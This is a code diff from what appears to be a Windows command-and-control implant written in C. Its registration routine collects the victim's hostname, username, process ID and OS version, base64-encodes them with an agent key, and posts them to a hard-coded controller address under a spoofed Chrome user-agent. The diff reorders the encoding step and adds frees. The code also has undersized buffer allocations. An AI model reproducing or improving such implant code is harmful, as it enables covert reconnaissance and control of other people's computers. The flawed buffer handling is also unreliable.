@@ -30,30 +30,12 @@ BOOL Registration(CHAR **cookie) {
 
     agent.identifier = "register";
 
-
-    CHAR *format = "%s:%s,%s,%d,%d,%s";
-    
-    CHAR *data_to_encode = malloc(strlen(format) + strlen(agent.identifier) + strlen(job.username) + strlen(job.hostname) + strlen(agent.key));
-    sprintf(data_to_encode, format, agent.identifier, job.username, job.hostname, job.process_id, job.version, agent.key);
-
-    CHAR *data_encode = malloc(strlen(data_to_encode));
-    DWORD data_encode_len = strlen(data_to_encode) * 2;
-    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
-
-    DWORD post_buffer_length = strlen(data_encode) + 5;
-    CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
-    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", data_encode);
-
-    CHAR content_length[MAX_PATH];
-    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
-
-
-    DWORD hostname_length = 260;
+    DWORD hostname_length = 256;
     if (myGetComputerNameA(job.hostname, &hostname_length)) {
         printf("Hostname: %s \n", job.hostname);
     }
 
-    DWORD username_buffer = 260;
+    DWORD username_buffer = 256;
     if (GetUserNameA(job.username, &username_buffer)) {
         printf("Username: %s \n", job.username);
     }
@@ -65,6 +47,27 @@ BOOL Registration(CHAR **cookie) {
     if (job.version = myGetVersion()) {
         printf("Host Version: %lu \n", job.version);
     }
+
+    CHAR *format = "%s:%s,%s,%d,%d,%s";
+    
+    CHAR *data_to_encode = malloc(strlen(format) + strlen(agent.identifier) + strlen(job.username) + strlen(job.hostname) + strlen(agent.key));
+    sprintf(data_to_encode, format, agent.identifier, job.username, job.hostname, job.process_id, job.version, agent.key);
+
+    CHAR *data_encode = (CHAR*)malloc(strlen(data_to_encode));
+    DWORD data_encode_len = strlen(data_to_encode) * 2;
+    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, data_encode, &data_encode_len);
+
+    free(data_to_encode);
+
+    DWORD post_buffer_length = strlen(data_encode) + 5;
+    CHAR *post_buffer = (CHAR*)calloc(strlen(data_encode) + 5, sizeof(CHAR));
+    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", data_encode);
+
+    free(data_encode);
+
+
+    CHAR content_length[MAX_PATH];
+    sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
 
 
     HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -215,6 +218,7 @@ char* Directoryyyyy() {
 }
 
 int main() {
+
     CHAR *cookie = NULL;
     agent.address = "192.168.227.131";
     agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
